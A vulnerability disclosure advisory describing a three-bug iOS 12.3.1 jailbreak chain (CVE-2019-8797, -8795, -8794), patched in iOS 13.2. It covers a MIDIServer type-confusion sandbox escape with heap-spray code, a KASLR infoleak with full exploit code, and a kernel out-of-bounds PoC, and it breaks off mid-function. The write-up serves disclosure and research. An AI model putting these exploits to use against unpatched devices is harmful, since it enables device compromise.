# SSD Advisory - iOS Jailbreak via Sandbox Escape and Kernel R/W leading to RCE

## Introduction

Each year, as part of [TyphoonCon](https://typhooncon.com/); our All Offensive Security Conference, we are offering cash prizes for vulnerabilities and exploitation techniques found. At our latest hacking competition: [TyphoonPwn](https://typhooncon.com/typhooncon-2019/typhoonpwn/) 2019, an independent Security Researcher demonstrated three vulnerabilities to our team which were followed by our live demonstration on stage. The Researcher was awarded an amazing sum of *60,000$* USD for his discovery!

[TyphoonCon](https://typhooncon.com/) will take place from June 15th to June 19th 2020, in Seoul, Korea. Reserve your spot for [TyphoonCon](https://typhooncon.com/) and register to [TyphoonPwn](https://typhooncon.com/typhooncon-2019/typhoonpwn/) for your chance to win up to 500K USD in prizes.

## Vulnerability Summary
This post describes a series of vulnerabilities found in iOS 12.3.1, which when chained together allows execution of code in the context of the kernel.

## CVEs
CVE-2019-8797
CVE-2019-8795
CVE-2019-8794

## Credit
An independent Security Researcher, 08Tc3wBB, has reported this vulnerability to SSD Secure Disclosure program during [TyphoonPwn](https://typhooncon.com/typhooncon-2019/typhoonpwn/) event and was awarded 60,000$ USD for his discovery.

## Affected Systems
iOS 12.3.1

## Vendor Response
Apple has fixed the vulnerabilities in iOS 13.2. For more information see [HT210721](https://support.apple.com/en-il/HT210721) advisory.

## Vulnerability Details
While the kernel has a large amount of userland-reachable functionality, much of this attack surface is not accessible due to sandboxing in iOS. By default, an app is only able to access about 10 drivers' userclients, which is a relatively small amount of code. Therefore, first escaping the app sandbox can be highly beneficial in order to attack the kernel.

### Escaping the Sandbox 

In contrast to the kernel, many daemons running in userland are accessible via the default app sandbox. One such example is a daemon called MIDIServer (com.apple.midiserver).
This daemon allows apps and other services to interface with MIDI hardware which may be connected to the device.

The MIDIServer binary itself is fairly simple. It is a stub binary, and all of it's functionality is actually stored in a library which is part of the shared cache (CoreMIDI): the `main()` function of MIDIServer simply calls `MIDIServerRun()`. 

CoreMIDI then sets up two sandbox-accessible Mach services, `com.apple.midiserver` and `com.apple.midiserver.io`. The former is a typical MIG-based Mach server, which implements 47 methods (as of writing). `com.apple.midiserver.io` however, is a custom implementation, used for transferring IO buffers between clients and the server. 

Here is the main run thread for the `io` Mach server:

```
__int64 MIDIIOThread::Run(MIDIIOThread *this, __int64 a2, __int64 a3, int *a4)
{
  x0 = XMachServer::CreateServerPort("com.apple.midiserver.io", 3, this + 140, a4);
  *(this + 36) = x0;

  if ( !*(this + 35) )
  {
    server_port = x0;
    *(this + 137) = 1;
    while ( 1 )
    {
      bufsz = 4;
      if ( XServerMachPort::ReceiveMessage(&server_port, &msg_cmd, &msg_buf, &bufsz) || msg_cmd == 3 )
        break;
      ResolvedOpaqueRef<ClientProcess>::ResolvedOpaqueRef(&v10, msg_buf);
      if ( v12 )
      {
        if ( msg_cmd == 1 )
        {
          ClientProcess::WriteDataAvailable(v12);
        }
        else if ( msg_cmd == 2 )
        {
          ClientProcess::EmptiedReadBuffer(v12);
        }
      }
      if ( v10 )
      {
        applesauce::experimental::sync::LockFreeHashTable<unsigned int,BaseOpaqueObject *,(applesauce::experimental::sync::LockFreeHashTableOptions)1>::Lookup::~Lookup(&v11);
        LOBYTE(v10) = 0;
      }
    }
    x0 = XServerMachPort::~XServerMachPort(&server_port);
  }
  
  return x0;
}
```

`XServerMachPort::ReceiveMessage` calls `mach_msg` with the `MACH_RCV_MSG` argument, waiting for messages on that port. The message contains a command ID and a length field, followed by the body of the message, which is parsed by the `ReceiveMessage` call. Three commands are available: command 1 will call `ClientProcess::WriteDataAvailable`, command 2 will call `ClientProcess::EmptiedReadBuffer`, and command 3 will exit the Mach server loop. The `v12` object passed to the `ClientProcess` calls is found via `ResolvedOpaqueRef`. This method will take the 4-byte buffer provided in the message (the ID of the object) and perform a hashtable lookup, returning the object into a structure on the stack (the `v12` variable denoted here lies within that structure).
The bug here is particularly nuanced, and lies within the `ResolvedOpaqueRef<ClientProcess>::ResolvedOpaqueRef` call.

The hashtable this method uses actually contains many different types of objects, not only those of the `ClientProcess` type. For example, objects created by the API methods `MIDIExternalDeviceCreate` and `MIDIDeviceAddEntity` are both stored in this hashtable. 
Given the correct type checks are in-place, this would be no issue. However, there are actually two possible ways of accessing this hashtable:

```
 - BaseOpaqueObject::ResolveOpaqueRef
 - ResolvedOpaqueRef<ClientProcess>::ResolvedOpaqueRef
```

The former, used for example in the `_MIDIDeviceAddEntity` method, contains the proper type checks:

```
  midi_device = BaseOpaqueObject::ResolveOpaqueRef(&TOpaqueRTTI<MIDIDevice>::sRTTI, device_id);
```

The latter method, however, does not. This means that by providing the ID of an object of a different type, you can cause a type confusion in one of the `ClientProcess` calls, where the method is expecting an object of type `ClientProcess *`.

Let's follow the call trace for the `EmptiedReadBuffer` call:

```
; __int64 MIDIIOThread::Run(MIDIIOThread *this)
__ZN12MIDIIOThread3RunEv
[...]
BL              __ZN13ClientProcess17EmptiedReadBufferEv ; ClientProcess::EmptiedReadBuffer(x0) // `x0` is potentially type confused


; __int64 ClientProcess::EmptiedReadBuffer(ClientProcess *this)
__ZN13ClientProcess17EmptiedReadBufferEv
                STP             X20, X19, [SP,#-0x10+var_10]!
                STP             X29, X30, [SP,#0x10+var_s0]
                ADD             X29, SP, #0x10
                MOV             X19, X0
                ADD             X0, X0, #0x20 ; this
                BL              __ZN22MIDIIORingBufferWriter19EmptySecondaryQueueEv ; MIDIIORingBufferWriter::EmptySecondaryQueue(x0)


; bool MIDIIORingBufferWriter::EmptySecondaryQueue(MIDIIORingBufferWriter *this)
__ZN22MIDIIORingBufferWriter19EmptySecondaryQueueEv

                STP             X28, X27, [SP,#-0x10+var_50]!
                STP             X26, X25, [SP,#0x50+var_40]
                STP             X24, X23, [SP,#0x50+var_30]
                STP             X22, X21, [SP,#0x50+var_20]
                STP             X20, X19, [SP,#0x50+var_10]
                STP             X29, X30, [SP,#0x50+var_s0]
                ADD             X29, SP, #0x50
                MOV             X21, X0
                MOV             X19, X0 ; x19 = (MIDIIORingBufferWritter *)this
                LDR             X8, [X19,#0x58]!
                LDR             X8, [X8,#0x10]
                MOV             X0, X19
                BLR             X8
```

As you can see here, the EmptiedReadBuffer code path will effectively immediately dereference a couple of pointers within the type-confused object and branch to an address which can be attacker controlled. The call looks something like this: `obj->0x78->0x10(obj->0x20)`. 

### Exploitation 

In order to exploit this bug we can confuse the `ClientProcess` type with a `MIDIEntity` instance. `MIDIEntity` is of size 0x78, which makes it a perfect target as it means the first dereference that is performed on the object (at 0x78) will be in out of bounds memory. You *could* then align some controlled data after the MIDIEntity object, however because we are in userland there is a better way.

The `MIDIObjectSetDataProperty` API call will unserialize CoreFoundation objects into MIDIServer's heap, so using this call we can spray CFData objects of size 0x90. The exploit then sends two Mach messages containing an OOL memory descriptor, mapped at the static address `0x29f000000` (for some reason it is required to send the message twice, else the memory will not be mapped; I am not sure on the cause of this). This memory is a large continuous CoW mapping which contains the ROP chain used later in exploitation, and importantly a function pointer located at the `0x10` offset to be dereferenced by the `EmptySecondaryQueue` code. 

The following code sets up the CFData objects which are sprayed into MIDIServer's heap:
```
  Prepare_bunch_keys(); // For iterating
  size_t spraybufsize = 0x90;
  void *spraybuf = malloc(spraybufsize);
  for(int i=0; i<spraybufsize; i+=0x8){
      *(uint64_t*)(spraybuf + i) = SPRAY_ADDRESS; // The 0x29f000000 address
  }
  CFDataRef spraydata = CFDataCreate(kCFAllocatorDefault, spraybuf, spraybufsize);
```

And the heap is crafted here:
```
  // OSStatus MIDIClientCreate(CFStringRef name, MIDINotifyProc notifyProc, void *notifyRefCon, MIDIClientRef *outClient);
  uint32_t mclient_id = 0;
  MIDIClientCreate(CFSTR(""), useless_notify, NULL, &mclient_id);
  printf("MIDI Client ID: 0x%x\n", mclient_id);
  
  // OSStatus MIDIExternalDeviceCreate(CFStringRef name, CFStringRef manufacturer, CFStringRef model, MIDIDeviceRef *outDevice);
  uint32_t mdevice_id = 0;
  MIDIExternalDeviceCreate(CFSTR(""), CFSTR(""), CFSTR(""), &mdevice_id);
  printf("MIDI Device ID: 0x%x\n", mdevice_id);
  
  // OSStatus MIDIObjectSetDataProperty(MIDIObjectRef obj, CFStringRef propertyID, CFDataRef data);
  for (int i = 0; i < 300; i++)
  {
      MIDIObjectSetDataProperty(mdevice_id, bunchkeys[i], spraydata); // Each call will unserialize one CFData object of size 0x90 
  }
  
  // Sends 1 OOL descriptor each with the spray memory mapping 
  Send_spray_mem();
  Send_spray_mem();
  
  // OSStatus MIDIObjectRemoveProperty(MIDIObjectRef obj, CFStringRef propertyID);
  // Removes every other property we just added
  for (int i = 0; i < 300; i = i + 2)
  {
      MIDIObjectRemoveProperty(mdevice_id, bunchkeys[i]); // Free's the CFData object, popping holes on the heap 
  }
```

At this point we now have 150 CFData allocations and 150 free'd holes of size 0x90, all containing the `SPRAY_ADDRESS` pointer. The next step is to fill one of these holes with a `MIDIEntity` object: 

```
  uint32_t mentity_id = 0;
  MIDIDeviceAddEntity(mdevice_id, CFSTR(""), false, 0, 0, &mentity_id);
  printf("mentity_id = 0x%x\n", mentity_id);
```

If all has gone to plan, we should now have a chunk of memory on the heap where the first 0x78 bytes are filled with the valid `MIDIEntity` object, and the remaining 0x18 bytes are filled with `SPRAY_ADDRESS` pointers.

In order to trigger the bug we can call to the `com.apple.midiserver.io` Mach server, with the ID of our target MIDIEntity object (`mentity_id`):

```
  // Sends msgh_id 0 with cmd 2 and datalen 4 (ClientProcess::EmptiedReadBuffer)
  Init_triggerExp_msg(mentity_id);
  Send_triggerExp_msg();
```

This will kick off the ROP chain on the Mach server thread in the MIDIServer process.

A simple failure check is then used, based on whether the ID of a new object is continuous to the object ID's seen before triggering the bug:

```
  // OSStatus MIDIExternalDeviceCreate(CFStringRef name, CFStringRef manufacturer, CFStringRef model, MIDIDeviceRef *outDevice);
  uint32_t verifysucc_mdevice_id = 0;
  MIDIExternalDeviceCreate(CFSTR(""), CFSTR(""), CFSTR(""), &verifysucc_mdevice_id);
  printf("verify_mdevice_id: 0x%x\n", verifysucc_mdevice_id);
  
  if (verifysucc_mdevice_id == mdevice_id + 2) 
  {
      break;
  }
  
  // We failed, reattempting...
  printf("Try again\n");
  MIDIRestart();
```

If the object ID's are not continuous, it means exploitation failed (ie. the daemon crashed), so the daemon is restarted via the `MIDIRestart` call and exploitation can be re-attempted.

I won't cover in detail how the ROP chain works, however the basic idea is to call `objc_release` on a buffer within the `SPRAY_ADDRESS` memory mapping, with a fake Objective-C object crafted at this address, on which the `release` method will be executed. A chain-calling primitive is then set up, with the target goal of opening 3 userclients, and hanging in a `mach_msg_receive` call to later overwrite some memory via `vm_read_overwrite` when a message is received -- this is utilized later in kernel exploitation.
It is to note that for this ROP-based exploitation methodology a PAC bypass would be required on A12 and newer processors (or ideally, a different exploitation methodology).

The userclients fetched from MIDIServer are `AppleSPUProfileDriver`, `IOSurfaceRoot`, and `AppleAVE2Driver`.

### (Ab)using AppleSPUProfileDriver: Kernel ASLR Defeat 

Via MIDIServer we are able to access the AppleSPUProfileDriver userclient. This userclient implements 12 methods, however we are only interested in the last: `AppleSPUProfileDriverUserClient::extSignalBreak`. Let's take a look at the pseudocode to get a rough idea of what's happening:

```
__int64 AppleSPUProfileDriver::signalBreakGated(AppleSPUProfileDriver *this)
{
  __int64 dataQueueLock; // x19
  unsigned __int64 v8; // x0
  __int64 result; // x0
  int v10; // [xsp+8h] [xbp-48h]
  int v11; // [xsp+Ch] [xbp-44h]
  __int64 v12; // [xsp+10h] [xbp-40h]
  __int64 v13; // [xsp+38h] [xbp-18h]

  dataQueueLock = this->dataQueueLock;
  IORecursiveLockLock(this->dataQueueLock);
  
  if ( this->dataQueue )
  {
    v10 = 0;
    abs_time = mach_absolute_time();
    v12 = AppleSPUProfileDriver::absolutetime_to_sputime(this, abs_time);
    v11 = OSIncrementAtomic(&this->atomicCount);
    (*(*this->dataQueue + 0x88∂LL))();           // IOSharedDataQueue::enqueue(&v10, 0x30)
  }

  result = IORecursiveLockUnlock(dataQueueLock);
  
  return result;
}
```

The function is fairly simple: it will take a lock, write some data to a buffer stored on the stack, and call `IOSharedDataQueue::enqueue` to submit that data to the queue, with a buffer size of 0x30. The way the stack is accessed here is not particularly clear, so let us instead look at the relevant parts of the disassembly:

```
; __int64 AppleSPUProfileDriver::signalBreakGated(AppleSPUProfileDriver *this)
__ZN21AppleSPUProfileDriver16signalBreakGatedEv

var_48          = -0x48
var_44          = -0x44
var_40          = -0x40
var_18          = -0x18
var_10          = -0x10
var_s0          =  0

                PACIBSP
                SUB             SP, SP, #0x60
                STP             X20, X19, [SP,#0x50+var_10]
                STP             X29, X30, [SP,#0x50+var_s0]
                ADD             X29, SP, #0x50
                MOV             X20, X0
                ADRP            X8, #___stack_chk_guard@PAGE
                NOP
                LDR             X8, [X8,#___stack_chk_guard@PAGEOFF]
                STUR            X8, [X29,#var_18]
                LDR             X19, [X0,#0x30B8]
                MOV             X0, X19
                BL              _IORecursiveLockLock
                LDR             X8, [X20,#0x90]
                CBZ             X8, branch_exit_stub
                STR             WZR, [SP,#0x50+var_48]
                BL              _mach_absolute_time
                MOV             X1, X0  ; unsigned __int64
                MOV             X0, X20 ; this
                BL              __ZN21AppleSPUProfileDriver23absolutetime_to_sputimeEy ; AppleSPUProfileDriver::absolutetime_to_sputime(ulong long)
                STR             X0, [SP,#0x50+var_40]
                MOV             W8, #0x30CC
                ADD             X0, X20, X8
                BL              _OSIncrementAtomic
                STR             W0, [SP,#0x50+var_44]
                LDR             X0, [X20,#0x90]
                LDR             X8, [X0]
                LDRAA           X9, [X8,#0x90]!
                MOVK            X8, #0x911C,LSL#48
                ADD             X1, SP, #0x50+var_48
                MOV             W2, #0x30
                BLRAA           X9, X8                        // Call to IOSharedDataQueue::enqueue

branch_exit_stub                    ; CODE XREF: AppleSPUProfileDriver::signalBreakGated(void)+38↑j
                MOV             X0, X19 ; lock
                BL              _IORecursiveLockUnlock
                LDUR            X8, [X29,#var_18]
                ADRP            X9, #___stack_chk_guard@PAGE
                NOP
                LDR             X9, [X9,#___stack_chk_guard@PAGEOFF]
                CMP             X9, X8
                B.NE            branch_stack_chk_fail
                MOV             W0, #0
                LDP             X29, X30, [SP,#0x50+var_s0]
                LDP             X20, X19, [SP,#0x50+var_10]
                ADD             SP, SP, #0x60
                RETAB
; ---------------------------------------------------------------------------

branch_stack_chk_fail                    ; CODE XREF: AppleSPUProfileDriver::signalBreakGated(void)+9C↑j
                BL              ___stack_chk_fail
```

We can see here that the 32-bit value zero is stored to `var_48`, the result of the `OSIncrementAtomic` call is stored to `var_44`, and the `absolutetime_to_sputime` return value is stored to `var_40`. However, remember that the size 0x30 is provided to the `IOSharedDataQueue::enqueue` call? This means that any uninitialized stack data will be leaked into the shared dataqueue! So while this dataqueue may contain leaked data, there are no security implications unless we are able to access this data. However, IOSharedDataQueue's are signed to be exactly that -- shared. Let's take a look at `AppleSPUProfileDriverUserClient::clientMemoryForType`:

```
__int64 AppleSPUProfileDriverUserClient::clientMemoryForType(AppleSPUProfileDriverUserClient *this, int type, unsigned int *options, IOMemoryDescriptor **memory)
{
  [...]

  ret = 0xE00002C2LL;
  if ( !type )
  {
    memDesc = AppleSPUProfileDriver::copyBuffer(this->provider);
    *memory = memDesc;
  
    if ( memDesc )
      ret = 0LL;
    else
      ret = 0xE00002D8LL;
  }

  return ret;
}

__int64 AppleSPUProfileDriver::copyBuffer(AppleSPUProfileDriver *this)
{
  [...]

  dataQueueLock = this->dataQueueLock;
  IORecursiveLockLock(this->dataQueueLock);

  memDesc = this->queueMemDesc;
  if ( memDesc )
  {
    (*(*memDesc + 0x20LL))();                   // OSObject::retain
    buf = this->queueMemDesc;
  }
  else
  {
    buf = 0LL;
  }

  IORecursiveLockUnlock(dataQueueLock);

  return buf;
}

```

So via `IOConnectMapMemory64` we can map in the memory descriptor for this `IOSharedDataQueue`, which contains any data enqueue'd to it, including our leaked stack data!
To finalize our understanding of this bug, let's look at an example of leaked data from the queue: 

```
30 00 00 00 
00 00 00 00 78 00 00 80 
c0 5a 0c 03 00 00 00 00 
00 f0 42 00 e0 ff ff ff 
50 b4 d8 3b e0 ff ff ff 
80 43 03 11 f0 ff ff ff 
00 00 00 00 00 00 00 00 
```

The first dword you can see is the `size` field of the `IODataQueueEntry` struct (0x30 in this case), which preceeds every chunk of data in the queue:

```
typedef struct _IODataQueueEntry{
    UInt32  size;
    UInt8   data[4];
} IODataQueueEntry;
```

Then we see the dword which is explicitly written to zero, the return value of the `OSIncrementAtomic` call (0x78), and the `absolutetime_to_sputime` value in the 3rd row. This data is then followed by 3 kernel pointers which are leaked off the stack. Specifically, we are interested in the 3rd pointer (`0xfffffff011034380`). From my testing (iPhone 8, iOS 12.4), this will always point into kernel's __TEXT region, so by calculating the unslid pointer we are able to deduce the kernel's slide. The full exploit for this infoleak can be seen below (some global variable definitions may be missing):

```
uint64_t check_memmap_for_kaslr(io_connect_t ioconn)
{
    kern_return_t ret;
    mach_vm_address_t map_addr = 0;
    mach_vm_size_t map_size = 0;
    
    ret = IOConnectMapMemory64(ioconn, 0, mach_task_self(), &map_addr, &map_size, kIOMapAnywhere);
    if (ret != KERN_SUCCESS)
    {
        printf("IOConnectMapMemory64 failed: %x %s\n", ret, mach_error_string(ret));
        return 0x0;
    }
    
    uint32_t search_val = 0xfffffff0; // Constant value of Kernel code segment higher 32bit addr
    uint64_t start_addr = map_addr;
    size_t search_size = map_size;

    while ((start_addr = (uint64_t)memmem((const void *)start_addr, search_size, &search_val, sizeof(search_val))))
    {
        uint64_t tmpcalc = *(uint64_t *)(start_addr - 4) - INFOLEAK_ADDR;
        
        // kaslr offset always be 0x1000 aligned
        if ((tmpcalc & 0xFFF) == 0x0)
        {
            return tmpcalc;
        }
        
        start_addr += sizeof(search_val);
        search_size = (uint64_t)map_addr + search_size - start_addr;
    }

    return 0x0;
}

mach_vm_offset_t get_kaslr(io_connect_t ioconn)
{
    uint64_t scalarInput = 1;

    // Allocte a new IOSharedDataQueue 
    // AppleSPUProfileDriverUserClient::extSetEnabledMethod
    IOConnectCallScalarMethod(ioconn, 0, &scalarInput, 1, NULL, NULL);
    
    int kaslr_iter = 0;
    while (!kaslr)
    {
        // AppleSPUProfileDriverUserClient::extSignalBreak
        // Enqueues a data item of size 0x30, leaking 0x18 bytes off the stack 
        IOConnectCallStructMethod(ioconn, 11, NULL, 0, NULL, NULL);
        
        // Map the IOSharedDataQueue and look for the leaked ptr 
        kaslr = check_memmap_for_kaslr(ioconn);
        
        if (kaslr_iter++ % 5 == 0)
        {
            scalarInput = 0;
            // AppleSPUProfileDriverUserClient::extSetEnabledMethod
            IOConnectCallScalarMethod(ioconn, 0, &scalarInput, 1, NULL, NULL);
         
            scalarInput = 1;
            // AppleSPUProfileDriverUserClient::extSetEnabledMethod
            IOConnectCallScalarMethod(ioconn, 0, &scalarInput, 1, NULL, NULL);
        }
    }

    scalarInput = 0;
    // AppleSPUProfileDriverUserClient::extSetEnabledMethod
    IOConnectCallScalarMethod(ioconn, 0, &scalarInput, 1, NULL, NULL); // Shutdown
    
    return kaslr;
}
```

### Going for Gold: Attacking the Kernel 

The final vulnerability in this chain is a missing bounds check in `AppleAVE2Driver`. AppleAVE2 is a graphics driver in iOS, and in our case is accessible via the MIDIServer sandbox escape.
The userclient exposes 24 methods, and this bug exists within the method at index 7; `_SetSessionSettings`. This method takes an input buffer of size `0x108`, and loads many IOSurfaces from ID's provided in the input buffer via the `AppleAVE2Driver::GetIOSurfaceFromCSID` method, before finally calling `AppleAVE2Driver::Enqueue`. Specifically, the method will load a surface by the name of `InitInfoSurfaceId` or `InitInfoBufferr`:

```
  if ( !structIn->InitInfoSurfaceId )
  {
    goto err;
  }
  
  [...]

  initInfoSurfaceId = structIn->InitInfoSurfaceId;
  if ( initInfoSurfaceId )
  {
    initInfoBuffer = AppleAVE2Driver::GetIOSurfaceFromCSID(this->provider, initInfoSurfaceId, this->task);
    this->InitInfoBuffer = initInfoBuffer;
    if ( initInfoBuffer )
      goto LABEL_13;
    
    goto err;
  }
```

The `AppleAVE2Driver::Enqueue` method will then create an `IOSurfaceBufferMngr` instance on this IOSurface:

```
  bufferMgr = operator new(0x70uLL);
  if ( !IOSurfaceBufferMngr::IOSurfaceBufferMngr(bufferMgr, 0LL, this) )
  {
    goto LABEL_23;
  }

  if ( IOSurfaceBufferMngr::CreateBufferFromIOSurface(
         bufferMgr,
         service->InitInfoBuffer,
         this->iosurfaceRoot,
         *&this->gap8[128],
         *&this->gap8[136],
         1,
         0,
         0,
         0,
         0,
         *&this->gap101[39],
         "InitInfo",
         this->gap3AF[49],
         0x1F4u) )
  {
    err = 0xE00002BDLL;
    v28 = IOSurfaceBufferMngr::~IOSurfaceBufferMngr(bufferMgr);
    operator delete(v28);
    return err;
  }

  if ( bufferMgr->size < 0x25DD0 )
  {
    err = 0xE00002BCLL;
    goto LABEL_27;
  }

  buffMgrKernAddr = bufferMgr->kernelAddress;
  if ( !buffMgrKernAddr )
  {
    goto LABEL_20;
  }
```

Bearing in mind the data within this buffer (now mapped at `buffMgrKernAddr`) is userland-controlled, the method will proceed to copy large chunks of data out of the buffer into an `AVEClient *` object, which I have named `currentClient`:

```
  currentClient->unsigned2400 = *(buffMgrKernAddr + 2008);
  memmove(&currentClient->unsigned2404, buffMgrKernAddr + 2012, 0x2BE4LL);
  currentClient->oword5018 = *(buffMgrKernAddr + 13296);
  currentClient->oword5008 = *(buffMgrKernAddr + 13280);
  currentClient->oword4FF8 = *(buffMgrKernAddr + 13264);
  currentClient->oword4FE8 = *(buffMgrKernAddr + 13248);
  currentClient->oword5058 = *(buffMgrKernAddr + 13360);
  currentClient->memoryInfoCnt2 = *(buffMgrKernAddr + 0x3420);
  currentClient->oword5038 = *(buffMgrKernAddr + 13328);
  currentClient->oword5028 = *(buffMgrKernAddr + 13312);
  currentClient->oword5098 = *(buffMgrKernAddr + 13424);
  currentClient->oword5088 = *(buffMgrKernAddr + 13408);
  currentClient->oword5078 = *(buffMgrKernAddr + 13392);
  currentClient->oword5068 = *(buffMgrKernAddr + 13376);
  currentClient->oword50C8 = *(buffMgrKernAddr + 13472);
  currentClient->oword50B8 = *(buffMgrKernAddr + 13456);
  currentClient->oword50A8 = *(buffMgrKernAddr + 13440);
  currentClient->qword50D8 = *(buffMgrKernAddr + 13488);
  memmove(&currentClient->sessionSettings_block1, buffMgrKernAddr, 0x630LL);
  memmove(&currentClient->gap1C8C[0x5CC], buffMgrKernAddr + 1584, 0x1A8LL);
```

When closing an AppleAVE2Driver userclient via `AppleAVE2DriverUserClient::_my_close`, the code will call a function named `AppleAVE2Driver::AVE_DestroyContext` on the `AVEClient` object associated with that userclient. `AVE_DestroyContext` calls `AppleAVE2Driver::DeleteMemoryInfo` on many `MEMORY_INFO` structures located within the AVEClient, and as the penultimate step calls this function on an array of `MEMORY_INFO` structures in the client, the quantity of which is denoted by the `memoryInfoCnt{1,2}` fields:

```
  v73 = currentClient->memoryInfoCnt1 + 2;
  if ( v73 <= currentClient->memoryInfoCnt2 )
    v73 = currentClient->memoryInfoCnt2;

  if ( v73 )
  {
    iter1 = 0LL;
    statsMapBufArr = currentClient->statsMapBufferArray;
    
    do
    {
      AppleAVE2Driver::DeleteMemoryInfo(this, statsMapBufArr);
      ++iter1;
      
      loopMax = currentClient->memoryInfoCnt1 + 2;
      cnt2 = currentClient->memoryInfoCnt2;

      if ( loopMax <= cnt2 )
        loopMax = cnt2;
      else
        loopMax = loopMax;
      
      statsMapBufArr += 0x28LL;
    }
    while ( iter1 < loopMax );
  }
```

In `_SetSessionSettings`, there are bounds checks on the value of `memoryInfoCnt1`:

```
  if ( currentClient->memoryInfoCnt1 >= 4u )
  {
    ret = 0xE00002BCLL;
    return ret;
  }
```

However no such bounds checks on the value of `memoryInfoCnt2`. This missing check, combined with the following piece of logic in the while loop, means that the loop will access and call `DeleteMemoryInfo` on out-of-bounds data, provided a high enough value is provided as `memoryInfoCnt2`:

```
  loopMax = currentClient->memoryInfoCnt1 + 2;  // Take memoryInfoCnt1 (max 4), loopMax is <=6

  cnt2 = currentClient->memoryInfoCnt2;         // Take memoyInfoCnt2
  if ( loopMax <= cnt2 )                        // if cnt2 is larger than loopMax...
    loopMax = cnt2;                             // update loopMax to the value of memoryInfoCnt2
  else
    loopMax = loopMax;                          // else, no change 
```

By default, there are 5 `MEMORY_INFO` structures within the `statsMapBufferArray`. With each entry being of size `0x28`, the array consumes `0xc8` (dec: `200`) bytes. Becuase this array is inlined within the `AVEClient *` object, when we trigger the out-of-bounds bug the next `DeleteMemoryInfo` call will use whatever data may follow the `statsMapBufferArray`. On my iPhone 8's 12.4 kernel, this array lies at offset `0x1b60`, meaning the 6th entry (the first out-of-bounds entry) will be at offset `0x1c28`. 
Now, remember how in `_SetSessionSettings` large chunks of data are copied from a user-controlled buffer into the AVEClient object? It just so happens that one of these controlled buffers lies directly after the `statsMapBufferArray` field!

```
  00000000 AVEClient       struc ; (sizeof=0x29AC8, align=0x8, mappedto_215)
  [...]
  00001B60 statsMapBufferArray DCB 200 dup(?)
  00001C28 sessionSettings_block1 DCB ?
  [...]
```

```
  // Copies from the IOSurface buffer to a buffer adjacent to the statsMapBufferArray
  memmove(&currentClient->sessionSettings_block1, buffMgrKernAddr, 0x630LL);
```

So by providing crafted data in the IOSurface buffer copied into the AVEClient, we can have full control over the out-of-bounds array entries.

### Taking (PC) Control 

Now let's look at the `AppleAVE2Driver::DeleteMemoryInfo` function itself, bearing in mind we have full control over the `memInfo` object:

```
__int64 AppleAVE2Driver::DeleteMemoryInfo(AppleAVE2Driver *this, IOSurfaceBufferMngr **memInfo)
{
  [...]

  if ( memInfo )
  {
    if ( *memInfo )
    {
      v8 = IOSurfaceBufferMngr::~IOSurfaceBufferMngr(*memInfo);
      operator delete(v8);
    }
    memset(memInfo, 0, 0x28uLL);
    result = 0LL;
  }
  else
  {
    result = 0xE00002BCLL;
  }

  return result;
}
```

The `IOSurfaceBufferMngr` destructor wraps directly around a static `IOSurfaceBufferMngr::RemoveBuffer` call:

```
IOSurfaceBufferMngr *IOSurfaceBufferMngr::~IOSurfaceBufferMngr(IOSurfaceBufferMngr *this)
{
  IOSurfaceBufferMngr::RemoveBuffer(this);
  return this;
}
```

`RemoveBuffer` then calls `IOSurfaceBufferMngr::CompleteFence`, which in this case is best viewed as assembly:

```
IOSurfaceBufferMngr::CompleteFence(IOSurfaceBufferMngr *this)

                STP             X20, X19, [SP,#-0x10+var_10]!
                STP             X29, X30, [SP,#0x10+var_s0]
                ADD             X29, SP, #0x10
                MOV             X19, X0                         // x19 = x0 (controlled pointer)
                LDR             X0, [X0,#0x58]                  // Loads x0->0x58
                CBZ             X0, exit_stub                   // Exits if the value is zero 
                LDRB            W8, [X19,#0x1E]                 // Loads some byte at x19->0x1e
                CBNZ            W8, exit_stub                   // Exits if the byte is non-zero
                MOV             W1, #0
                BL              IOFence::complete
                LDR             X0, [X19,#0x58]                 // Loads x19->0x58
                LDR             X8, [X0]                        // Loads x0->0x0
                LDR             X8, [X8,#0x28]                  // Loads function pointer x8->0x28
                BLR             X8                              // Branches to fptr, giving arbitrary PC control
                STR             XZR, [X19,#0x58]

exit_stub
                LDP             X29, X30, [SP,#0x10+var_s0]
                LDP             X20, X19, [SP+0x10+var_10],#0x20
                RET
```

In essence, by crafting a userland-shared buffer you can trigger an out-of-bounds access, which will almost directly give arbitrary PC control upon closing the userclient. 

Here's a PoC for this bug, it will panic the device with a dereference to the address `0x4141414142424242`:

```
void kernel_bug_poc(io_connect_t ioconn, io_connect_t surface_ioconn)
{
    kern_return_t ret;

    {
        char open_inputStruct[0x8] = { 0 };
        char open_outputStruct[0x4] = { 0 };
        size_t open_outputStruct_size = sizeof(open_outputStruct);

        // AppleAVE2UserClient::_my_open
        ret = IOConnectCallStructMethod(ioconn, 
                                        0, 
                                        open_inputStruct, 
                                        sizeof(open_inputStruct), 
                                        open_outputStruct, 
                                        &open_outputStruct_size);
        NSLog(@"my_open: %x %s", ret, mach_error_string(ret));
    }

    // Create an IOSurface using the IOSurface client owned by MIDIServer
    // Address & size of the shared mapping created by IOSurface and
    // returned in the output struct at offsets 0x0 and 0x1c respectively
    uint64_t surface_map_addr = 0x0;
    uint32_t surface_map_size = 0x0;
    uint32_t surface_id = IOSurfaceRootUserClient_CreateSurface(surface_ioconn, &surface_map_addr, &surface_map_size);
    NSLog(@"Got Surface ID: %d", surface_id);

    uintptr_t surface_data = malloc(surface_map_size);
    bzero((void *)surface_data, surface_map_size);

    *(uint64_t *)(surface_data + 0x0) = 0x4141414142424242;     // First pointer to memory containing function pointer
                                                                // This field is the start of the block adjacent to the stats array
    *(uint32_t *)(surface_data + 0x3420) = 6;                   // `memoryInfoCnt2` field, gives 1 OOB access

    // Sends the data to MIDIServer to be written onto the IOSurface
    // The MIDIServer ROP chain hangs on the following call:
    // vm_read_overwrite(ourtask, clientbuf, surface1_map_size, surface1_map_addr, ...)
    send_overwriting_iosurface_map(surface_data, surface_map_size, surface_map_addr);

    // Waits for a message back from MIDIServer, sent by the ROP chain
    // Notifies us that the vm_read_overwrite call completed  
    reply_notify_completion();

    free(surface_data);

    {
        // Write the OOB count value to the `currentClient` object, and write our adjacent data

        char setSessionSettings_inputStruct[0x108] = { 0 };
        char setSessionSettings_outputStruct[0x4] = { 0 };
        size_t setSessionSettings_outputStruct_size = sizeof(setSessionSettings_outputStruct);

        *(uint32_t *)(setSessionSettings_inputStruct + 0x04) = surface_id; // FrameQueueSurfaceId
        *(uint32_t *)(setSessionSettings_inputStruct + 0x08) = surface_id; // InitInfoSurfaceId, vulnerable IOSurface mapping 
